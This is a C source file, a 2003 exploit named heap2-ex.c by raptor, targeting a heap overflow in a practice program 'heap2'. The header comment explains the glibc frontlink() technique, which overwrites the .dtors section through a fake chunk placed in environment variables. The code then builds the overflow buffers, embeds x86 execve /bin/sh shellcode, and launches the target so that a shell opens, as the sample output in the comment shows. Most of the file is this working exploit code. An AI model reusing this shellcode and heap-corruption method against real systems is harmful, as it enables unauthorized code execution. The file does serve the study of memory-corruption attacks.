/*
 * $Id: heap2-ex.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * heap2-ex.c - heap2.c exploit (frontlink() technique)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * See http://www.phrack.org/phrack/57/p57-0x08
 *
 * "The frontlink() technique is less flexible and more difficult to implement
 * than the unlink() technique, however it may be an interesting option since
 * its preconditions are different." -- Michel Kaempf <maxx@synnergy.net>
 *
 * The fd field of the corrupted boundary tag associated with the fifth chunk
 * (placed right after the overflowable fourth chunk) is read during the call
 * to the frontlink() macro, since:
 *
 * 1)	The second chunk (effective size = 1504) should be inserted in the same
 * 	doubly-linked list of the fifth chunk (effective size = 1512).
 * 2)	The second chunk should be inserted after the fifth chunk in that list.
 *
 * This exploit overflows the fourth buffer and overwrites the fd field of the
 * fifth chunk with the address of a fake chunk stored in the environment
 * variables passed to the vulnerable program. The size field of this fake
 * chunk is set to 0, in order to trick free() into leaving the loop of the
 * frontlink() macro while fd points to that fake chunk, and in the bk field
 * of the fake chunk is stored the address (minus 8 bytes) of .dtors section.
 * The overwritten .dtors function pointer is read and executed at the end of
 * the vulnerable program. Since the attacker can control (via argv[2]) the
 * content and size of the first chunk (located immediately before the second 
 * chunk), he can store valid machine code in the prev_size field of the second
 * chunk. In other words: voodoo magic ;)
 *
 * $ ./heap2-ex
 * Using .dtors address: 0x80495EC
 * Using ret: 0xBFFFFFE3
 * sh-2.05$ 
 *
 * Tested on Linux+Owl with gcc-2.95.3. Grab the .dtors address as follows:
 *
 * $ objdump -j .dtors -s heap2
 * [...]
 * Contents of section .dtors:
 * 80495e8 ffffffff 00000000                    ........        
 * ^^^^^^^\__(this is the .dtors section address)
 *
 * NOTE. The last 4 bytes of the modified shellcode (including the terminating
 * NULL character) are stored in the last 4 bytes of the first buffer (the 
 * prev_size field of the second chunk) and correspond to a jmp instruction
 * pointing to the classic shellcode stored right before.
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF1	677		// 676 + 1
#define BUF2	28		// 32 - 4
#define FAKE	17		// 16 + 1
#define JUNK 	0xdeadbeef	// random junk
#define DTORS 	(0x80495e8 + 4)	// .dtors section address

char sc[] = /* linux/x86 shellcode (24 + 4 = 28 bytes) */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
/* jmp -26 */
"\xeb\xe6?";

int main(int argc, char *argv[])
{
        char *p;
        char buf1[BUF1], buf2[BUF2], fake_chunk[FAKE];
        char ** envp;
        int env_size = 0;

	/* calculate the ret address */
	int ret = (0xbfffffff - 4) - FAKE - strlen("./heap2");

	fprintf(stderr, "Using .dtors address: 0x%X\n", DTORS);
	fprintf(stderr, "Using ret: 0x%X\n", ret);

	/* first buffer (argv[1]) */
        p = buf1;
        memset(p, 'A', 676 - 4);		/* padding */
        p += 676 - 4;
	*((void **)p) = (void *)(ret);		/* fd field of fifth chunk */
        p += 4;
        *p = 0x0;				/* NULL termination */

	/* second buffer (argv[2]) */
        p = buf2;
        memset(p, 'A', BUF2 - sizeof(sc));	/* padding */
        p += BUF2 - sizeof(sc);
        memcpy(p, sc, sizeof(sc));		/* our shellcode */

	/* fake chunk */
        p = fake_chunk;
	*((void **)p) = (void *)(JUNK);		/* prev_size field */
        p += 4;
	*((void **)p) = (void *)(0);		/* size field */
	p += 4;
	*((void **)p) = (void *)(JUNK);		/* fd field */
	p += 4;
	*((void **)p) = (void *)(DTORS - 8);	/* bk field */
	p += 4;
	*p = 0x0;				/* NULL termination */

	/* calculate the needed environment size */
        for ( p = fake_chunk; p < fake_chunk + FAKE; p++ ) {
                if (*p == 0x0) {
                        env_size++;
                }
        }
        env_size++;

        /* allocate memory for the envp array */
        envp = (char **)malloc(env_size * sizeof(char *));

        /* fill the envp array */
        env_size = 0;
        for ( p = fake_chunk; p < fake_chunk + FAKE; p += strlen(p)+1 ) {
                envp[ env_size++ ] = p;
        }
        envp[env_size] = NULL;

        /* run the vulnerable program */
        execle("./heap2", "heap2", buf1, buf2, NULL, envp);
	perror("execle");
}
